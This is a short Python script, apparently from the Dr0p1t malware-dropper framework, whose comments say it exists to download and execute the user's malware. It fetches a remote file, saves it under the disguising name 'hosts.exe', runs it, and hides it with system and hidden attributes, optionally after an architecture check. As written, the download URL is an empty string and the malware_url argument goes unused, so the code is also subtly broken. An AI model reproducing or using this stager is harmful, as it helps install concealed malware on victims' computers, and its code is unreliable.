#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to download and execute your malware (¯\_(ツ)_/¯)
#Start
from os import popen,_exit
from urllib.request import urlretrieve
from platform import architecture

def fire_things_up(malware_url,arch="No"):
    url   = ""
    #check architecture
    if arch != "No":
        if architecture()[0][:2] == arch:
            x = urlretrieve(url,"hosts.exe")
            xx = popen("hosts.exe")
            xxx = popen("attrib +s +h hosts.exe")
            _exit()
    else:
        x = urlretrieve(url,"hosts.exe")
        xx = popen("hosts.exe")
        xxx = popen("attrib +s +h hosts.exe") #hiding the file
